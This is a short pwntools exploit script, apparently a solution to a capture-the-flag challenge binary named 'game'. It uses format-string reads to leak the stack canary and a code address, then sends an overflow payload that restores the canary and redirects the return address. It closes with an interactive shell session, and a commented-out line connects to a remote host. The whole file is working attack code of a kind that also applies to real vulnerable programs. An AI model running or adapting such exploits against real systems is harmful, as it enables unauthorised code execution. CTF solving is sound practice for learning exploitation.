from pwn import *
context.terminal=['bash']
context.log_level='debug'
p=process('./game')
#p=remote('159.65.68.241',10002)
p.recvuntil('?')
p.sendline('%71$p'.ljust(250,b'\x00')+p32(0x365))
p.recvuntil(':\n')
canary=p.recvuntil('W')[:-1]
print('canary is '+ canary)
gdb.attach(p)
pause()
p.sendline('%3$p'.ljust(250,'\x00')+p32(0x19))
p.recvuntil(':\n')
base=p.recvuntil('W')[:-1]
print('base is '+ base)
#gdb.attach(p)
p.sendline('\x00'*0x100+p32(int(canary,16))+'A'*12+p32(int(base[:-3]+'2f5',16)))
p.interactive()
